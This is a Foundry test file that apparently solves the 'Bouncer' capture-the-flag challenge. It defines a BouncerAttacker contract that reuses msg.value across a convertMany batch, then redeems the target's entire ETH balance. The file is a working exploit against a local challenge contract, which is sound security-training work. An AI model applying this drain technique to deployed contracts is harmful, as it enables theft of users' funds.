// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Setup, Bouncer, ERC20Like} from "../src/bouncer/public/contracts/Setup.sol";

contract BouncerTest is Test {

    Setup internal setup;
    Bouncer internal bouncer;
    address msgSender = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    BouncerAttacker attacker;

    function setUp() public {
        setup = new Setup{value: 100 ether}();
        bouncer = Setup(setup).bouncer();
        attacker = new BouncerAttacker(bouncer);

        console.log("attacker address", address(attacker));
        console.log("bouncer address", address(bouncer));

        console.log("");
    }

    function testBouncer() public {
        address[] memory tokens = new address[](1);
        tokens[0] = ETH;

        console.log("bouncer balance before setup in ETH", address(bouncer).balance / 1e18);

        uint256 numToEnter = 2;
        uint256 setUpValue = numToEnter * 1e18;
        uint256 amount = (address(bouncer).balance + setUpValue) / (numToEnter - 1);
        console.log("amount in ETH", amount  / 1e18);

        startHoax(msgSender, 100 ether);
        attacker.setUpAttack{value: setUpValue}(numToEnter, amount);

        console.log("bouncer balance after setup in ETH", address(bouncer).balance / 1e18);

        vm.warp(block.timestamp + 1 days);

        attacker.attack{value: amount}(getIds(numToEnter));

        console.log("bouncer balance after attack", address(bouncer).balance);
        printArray(bouncer.contributions(address(attacker), tokens));
        console.log("challenge solved", setup.isSolved());
    }

    function printArray(uint[] memory array) public {
        for (uint i = 0; i < array.length; i++) {
            console.log("array[%d] = %d", i, array[i]);
        }
    }

    function getIds(uint num) public returns (uint256[] memory ids) {
        ids = new uint256[](num);
        for (uint i = 0; i < num; i++) {
            ids[i] = i;
        }
    }
}

contract BouncerAttacker {

    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    Bouncer b;

    constructor(Bouncer _b) {
        b = _b;
    }

    receive () external payable {}

    function setUpAttack(uint numToEnter, uint256 amount) external payable {
        for (uint i; i < numToEnter; i++) {
            b.enter{value: 1 ether}(ETH, amount);
        }
    }

    function attack(uint256[] memory ids) public payable {
        b.convertMany{value:msg.value}(address(this), ids);
        b.redeem(ERC20Like(ETH), address(b).balance);
    }

}
